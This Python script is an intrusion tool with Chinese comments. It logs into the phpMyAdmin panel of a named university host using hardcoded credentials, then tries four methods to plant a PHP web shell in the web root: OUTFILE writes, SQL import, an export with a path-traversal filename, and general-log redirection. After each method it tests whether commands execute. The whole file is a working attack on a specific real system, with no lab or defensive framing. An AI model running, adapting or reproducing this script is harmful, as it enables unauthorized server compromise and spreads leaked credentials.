#!/usr/bin/env python3
import requests
import re
import urllib3
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print(f"[+] Token: {token}")

# 方法1: 检查secure_file_priv的实际值
print("[*] 检查secure_file_priv...")
sql_data = {"sql_query": "SHOW VARIABLES LIKE 'secure_file_priv';", "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
if "NULL" in resp.text or "empty" in resp.text.lower():
    print("[+] secure_file_priv为NULL或空，可以写入!")
    # 尝试写入
    sql = "SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/enmeeting/shell.php';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    time.sleep(1)
    test_shell = requests.get("https://olympic.su.ac.th/enmeeting/shell.php?c=id", verify=False, timeout=5)
    if "uid=" in test_shell.text:
        print(f"[+] Shell获取成功: https://olympic.su.ac.th/enmeeting/shell.php?c=id")
        exit(0)
elif "/tmp" in resp.text or "/var/tmp" in resp.text:
    print(f"[*] secure_file_priv限制到特定目录")
    allowed_dir = "/tmp" if "/tmp" in resp.text else "/var/tmp"
    # 写入到允许的目录
    sql = f"SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '{allowed_dir}/shell.php';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

# 方法2: 通过phpMyAdmin的导入功能，上传SQL文件
print("[*] 方法2: 导入SQL文件...")
sql_content = """SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/enmeeting/shell.php';
"""
files = {"import_file": ("shell.sql", sql_content, "application/sql")}
data = {
    "format": "sql",
    "token": token,
    "db": "scmeeting",
    "sql_compatibility": "NONE",
    "import_type": "sql",
    "charset_of_file": "utf-8",
}

import_resp = session.post(url + "db_import.php", params={"token": token, "db": "scmeeting"}, files=files, data=data, verify=False, timeout=15)

time.sleep(3)
test_shell = requests.get("https://olympic.su.ac.th/enmeeting/shell.php?c=id", verify=False, timeout=5)
if "uid=" in test_shell.text:
    print(f"[+] Shell获取成功(导入): https://olympic.su.ac.th/enmeeting/shell.php?c=id")
    exit(0)

# 方法3: 通过phpMyAdmin的导出功能，导出为PHP
print("[*] 方法3: 导出为PHP文件...")
# 创建表
sql = "CREATE TABLE IF NOT EXISTS scmeeting.shell(code TEXT); INSERT INTO scmeeting.shell VALUES('<?php system($_GET[\"c\"]); ?>');"
sql_data = {"sql_query": sql, "db": "scmeeting"}
session.post(url + "db_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data, verify=False)

# 导出
export_data = {
    "export_type": "custom",
    "what": "sql",
    "sql_query": "SELECT code FROM scmeeting.shell;",
    "asfile": "savefile",
    "filename_template": "../../../../var/www/html/enmeeting/shell.php",
    "remember_template": "on",
}

export_resp = session.post(url + "db_export.php", params={"token": token, "db": "scmeeting"}, data=export_data, verify=False, timeout=15)

time.sleep(2)
test_shell = requests.get("https://olympic.su.ac.th/enmeeting/shell.php?c=id", verify=False, timeout=5)
if "uid=" in test_shell.text:
    print(f"[+] Shell获取成功(导出): https://olympic.su.ac.th/enmeeting/shell.php?c=id")
    exit(0)

# 方法4: 通过数据库日志，但写入到web目录
print("[*] 方法4: 数据库日志到web目录...")
log_paths = [
    "/var/www/html/enmeeting/log.php",
    "/var/www/html/log.php",
]

for log_path in log_paths:
    sql = f"SET GLOBAL general_log_file = '{log_path}';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    sql = "SET GLOBAL general_log = 'ON';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    sql = "SELECT '<?php system($_GET[\"c\"]); ?>';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    sql = "SET GLOBAL general_log = 'OFF';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    time.sleep(2)
    http_path = log_path.replace("/var/www/html", "")
    test_url = f"https://olympic.su.ac.th{http_path}?c=id"
    test_resp = requests.get(test_url, verify=False, timeout=5)
    if "uid=" in test_resp.text:
        print(f"[+] Shell获取成功: {test_url}")
        exit(0)

print("[-] 继续尝试其他方法...")
